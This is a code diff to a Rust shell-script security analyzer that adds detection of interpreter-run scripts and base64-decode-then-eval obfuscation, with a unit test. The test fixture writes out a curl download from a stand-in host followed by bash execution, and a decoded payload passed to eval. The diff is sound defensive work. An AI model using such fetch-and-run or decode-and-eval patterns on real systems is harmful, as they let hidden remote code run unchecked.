@@ -2555,6 +2555,13 @@ fn analyze_shell_security_line(path: &str, line_number: usize, line: &str) -> Ve
         &mut signals,
         detect_obfuscated_command(path, line_number, line, &code, &tokens),
     );
+    signals.extend(detect_shell_subprocess_execution(
+        path,
+        line_number,
+        line,
+        &code,
+        &tokens,
+    ));
     signals.extend(detect_file_writes(path, line_number, line, &code, &tokens));
     push_optional_signal(
         &mut signals,
@@ -3617,6 +3624,87 @@ fn detect_git_history_modification(
     ))
 }
 
+fn detect_shell_subprocess_execution(
+    path: &str,
+    line_number: usize,
+    line: &str,
+    code: &str,
+    tokens: &[ShellToken],
+) -> Vec<SecuritySignal> {
+    let command_indices = shell_command_token_indices(code, tokens);
+    let mut signals = Vec::new();
+
+    for command_index in command_indices {
+        let command = shell_command_name(&tokens[command_index].text);
+        let command_end = shell_command_argument_end_index(code, tokens, command_index);
+        let target = if shell_interpreter_command(command) {
+            shell_interpreter_script_target(&tokens[command_index + 1..command_end])
+        } else if shell_executable_script_target(command) {
+            Some(tokens[command_index].text.clone())
+        } else {
+            None
+        };
+
+        let Some(target) = target else {
+            continue;
+        };
+
+        signals.push(shell_signal!(
+            path,
+            line_number,
+            tokens[command_index].start + 1,
+            SecuritySignalKind::SubprocessExecution,
+            None,
+            Some(SecuritySink {
+                kind: SecuritySinkKind::ProcessExecution,
+                target: Some(target),
+            }),
+            SecurityRiskScore::new(65),
+            AnalyzerConfidence::Medium,
+            &shell_evidence(line),
+        ));
+    }
+
+    signals
+}
+
+fn shell_interpreter_command(command: &str) -> bool {
+    matches!(
+        command,
+        "sh" | "bash"
+            | "dash"
+            | "zsh"
+            | "ksh"
+            | "pwsh"
+            | "powershell"
+            | "powershell.exe"
+            | "python"
+            | "python3"
+            | "node"
+    )
+}
+
+fn shell_interpreter_script_target(tokens: &[ShellToken]) -> Option<String> {
+    tokens
+        .iter()
+        .find(|token| {
+            !token.text.starts_with('-')
+                && token.text != "-c"
+                && token.text != "-Command"
+                && has_executable_suffix(
+                    token
+                        .text
+                        .trim_matches(|character| matches!(character, '"' | '\'' | '`')),
+                )
+        })
+        .map(|token| token.text.clone())
+}
+
+fn shell_executable_script_target(target: &str) -> bool {
+    let normalized = target.trim_matches(|character| matches!(character, '"' | '\'' | '`'));
+    (normalized.starts_with("./") || normalized.contains('/')) && has_executable_suffix(normalized)
+}
+
 fn detect_obfuscated_command(
     path: &str,
     line_number: usize,
@@ -3631,6 +3719,10 @@ fn detect_obfuscated_command(
         .map(|&index| &tokens[index])
         .find(|token| shell_command_name(&token.text) == "eval")
     {
+        let target = shell_eval_target_variable(line)
+            .map(|variable| format!("eval:{variable}"))
+            .unwrap_or_else(|| "eval".to_owned());
+
         return Some(shell_signal!(
             path,
             line_number,
@@ -3639,7 +3731,7 @@ fn detect_obfuscated_command(
             None,
             Some(SecuritySink {
                 kind: SecuritySinkKind::DynamicCodeEvaluation,
-                target: Some("eval".to_owned()),
+                target: Some(target),
             }),
             SecurityRiskScore::new(70),
             AnalyzerConfidence::Medium,
@@ -3676,7 +3768,65 @@ fn detect_obfuscated_command(
         ));
     }
 
+    if decodes {
+        if let Some(variable) = shell_decode_assignment_target(code, tokens[base64_index].start) {
+            return Some(shell_signal!(
+                path,
+                line_number,
+                tokens[base64_index].start + 1,
+                SecuritySignalKind::ObfuscatedCommand,
+                Some(SecuritySource {
+                    kind: SecuritySourceKind::ProcessArgument,
+                    name: Some(variable),
+                }),
+                None,
+                SecurityRiskScore::new(65),
+                AnalyzerConfidence::Medium,
+                &shell_evidence(line),
+            ));
+        }
+    }
+
     None
+}
+
+fn shell_decode_assignment_target(code: &str, base64_start: usize) -> Option<String> {
+    let before_base64 = code.get(..base64_start)?;
+    let substitution_start = before_base64.rfind("$(")?;
+    let assignment_end = before_base64
+        .get(..substitution_start)?
+        .trim_end()
+        .rfind('=')?;
+    let before_assignment = before_base64.get(..assignment_end)?.trim_end();
+    let variable = before_assignment
+        .rsplit(|character: char| !(character.is_ascii_alphanumeric() || character == '_'))
+        .next()?;
+
+    (!variable.is_empty()
+        && variable
+            .chars()
+            .next()
+            .is_some_and(|character| character.is_ascii_alphabetic() || character == '_'))
+    .then(|| variable.to_owned())
+}
+
+fn shell_eval_target_variable(line: &str) -> Option<String> {
+    let eval_index = line.find("eval")?;
+    let after_eval = line.get(eval_index + "eval".len()..)?;
+    let dollar_index = after_eval.find('$')?;
+    let after_dollar = after_eval.get(dollar_index + 1..)?;
+    let after_dollar = after_dollar
+        .trim_start_matches(|character| matches!(character, '"' | '\'' | '`'))
+        .strip_prefix('{')
+        .unwrap_or_else(|| {
+            after_dollar.trim_start_matches(|character| matches!(character, '"' | '\'' | '`'))
+        });
+    let variable = after_dollar
+        .chars()
+        .take_while(|character| character.is_ascii_alphanumeric() || *character == '_')
+        .collect::<String>();
+
+    (!variable.is_empty()).then_some(variable)
 }
 
 fn detect_file_writes(
@@ -6501,6 +6651,47 @@ mod tests {
                     && signal.classification == ClassificationMethod::RegexFallback
             }));
         }
+    }
+
+    #[test]
+    fn shell_security_analyzer_emits_correlation_facts_for_download_and_decode_execution() {
+        let script = concat!(
+            "curl -fsSLo scripts/setup.sh https://example.test/setup.sh\n",
+            "bash scripts/setup.sh\n",
+            "payload=$(printf 'ZWNobyBvaAo=' | base64 -d)\n",
+            "eval \"$payload\"\n",
+        );
+
+        let output = shell_security_analyzer().analyze(&analyzer_input(
+            "scripts/bootstrap.sh",
+            script.as_bytes(),
+            &[SecurityArtifactClassificationSignal::Extension],
+            &[],
+            &[],
+        ));
+
+        assert!(output.signals.iter().any(|signal| {
+            signal.kind == SecuritySignalKind::ExecutableDownload
+                && signal.sink.as_ref().and_then(|sink| sink.target.as_deref())
+                    == Some("https://example.test/setup.sh")
+        }));
+        assert!(output.signals.iter().any(|signal| {
+            signal.kind == SecuritySignalKind::SubprocessExecution
+                && signal.sink.as_ref().and_then(|sink| sink.target.as_deref())
+                    == Some("scripts/setup.sh")
+        }));
+        assert!(output.signals.iter().any(|signal| {
+            signal.kind == SecuritySignalKind::ObfuscatedCommand
+                && signal
+                    .source
+                    .as_ref()
+                    .is_some_and(|source| source.name.as_deref() == Some("payload"))
+        }));
+        assert!(output.signals.iter().any(|signal| {
+            signal.kind == SecuritySignalKind::ObfuscatedCommand
+                && signal.sink.as_ref().and_then(|sink| sink.target.as_deref())
+                    == Some("eval:payload")
+        }));
     }
 
     #[test]
